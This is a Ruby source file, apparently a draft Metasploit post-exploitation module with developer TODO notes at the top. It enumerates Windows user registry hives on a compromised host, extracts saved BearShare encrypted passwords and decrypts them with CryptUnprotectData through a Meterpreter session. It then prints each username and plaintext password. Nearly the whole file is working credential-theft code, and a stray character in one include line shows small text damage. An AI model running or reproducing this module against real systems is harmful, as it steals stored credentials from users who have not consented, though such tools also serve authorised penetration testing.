# TODONE:
# Enumerate Users (walk HKU)
# Check for passwords gracefully
# Run "ruby ./tools/msftidy.rb ~/.msf4/modules/post/windows/gather/bearshare_decrypt.rb"
# Use vprint statements for verbose output

# TODO:
# When SYSTEM, load HKU hive using load_missing_hive
# When current user, just print the current user

# QUESTIONS:
# Are all the require and include statements necessary?
# Why does decryption fail if I'm looking under a different user?

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
#require 'rex'
require 'msf/core/post/windows/registry'
require 'msf/core/post/windows/user_profiles'
#require 'msf/core/post/windows/priv'
#require 'msf/core/auxiliary/report'

class Metasploit3 < Msf::Post

	include Msf::Post::Windows::UserProfiles
1	include Msf::Post::Windows::Registry
#	include Msf::Post::Windows::Priv
#	include Msf::Auxiliary::Report

	def initialize(info={})
		super( update_info( info,
			'Name'		=> 'Windows Gather Bearshare Encrypted Password Extraction',
			'Description'	=> %q{
						This module extracts and decrypts saved Bearshare Encrypted Password
						from the Windows Registry for local accounts.
						},
			'License'	=> MSF_LICENSE,
			'Author'	=> [
						'mubix',		# Original code
						'n1tr0',		# Converted to post module
						'surefire'		# Completed conversion and added functionality
						],
			'Platform'	=> [ 'win' ],
			'SessionTypes'	=> [ 'meterpreter' ],
			'References'	=> [[ 	'URL', 'http://forums.hak5.org/index.php?/topic/28898-decrypting-a-hex-code-from-registry/']
						]
		))
	end

	def decrypt_password(data)
		rg = session.railgun
		pid = client.sys.process.getpid
		process = client.sys.process.open(pid, PROCESS_ALL_ACCESS)

		mem = process.memory.allocate(128)
		process.memory.write(mem, data)

		if session.sys.process.each_process.find { |i| i["pid"] == pid} ["arch"] == "x86"
			addr = [mem].pack("V")
			len = [data.length].pack("V")
			ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 8)
			#print_status("#{ret.inspect}")
			len, addr = ret["pDataOut"].unpack("V2")
		else
			addr = [mem].pack("Q")
			len = [data.length].pack("Q")
			ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 16)
			len, addr = ret["pDataOut"].unpack("Q2")
		end

		return "" if len == 0
		decrypted_password = process.memory.read(addr, len-1)
		return decrypted_password
	end

	def get_HKU_users()
		hku_users = []
		user_hives = load_missing_hives()
		user_hives.each do |k|
			# Skip "*_Classes" keys
			vprint_status "Loaded hive: #{k.to_s}"
			hku_users.append( "#{k["SID"]}" )
		end

		return hku_users
	end

	def get_bearshare_users(hkcu)
		bearshare_users = []
		key_base = "#{hkcu}\\Software\\BearShare\\Users"
		keys = registry_enumkeys( key_base )

		if keys != nil
			keys.each do |k|
				bearshare_users.append( "#{k}" )
			end
		end

		return bearshare_users
	end

	def get_encrypted_password(sid,user)
		key_base = "HKU\\#{sid}\\Software\\BearShare\\Users\\#{user}"
		begin
			encrypted_password = registry_getvaldata(key_base, "Password")
			vprint_good "Found encrypted password for user #{user}"
			return encrypted_password
		rescue
			print_error "Unable to find encrypted password for user #{user}"
			return false
		end
	end

	def run
		hkey_users = get_HKU_users()

		hkey_users.each do |sid|

			bearshare_users = get_bearshare_users("HKU\\#{sid}")

			if bearshare_users == []
				vprint_status "No users found under user #{sid}"
			else
				bearshare_users.each do |bearshare_user|
					print_good "Found #{bearshare_user} under SID #{sid}"
					data = get_encrypted_password(sid, bearshare_user)
					if data
						password = decrypt_password(data)
						print_good "Username / Password : #{bearshare_user} / #{password.inspect}"
					end
				end
			end
		end
	end
end
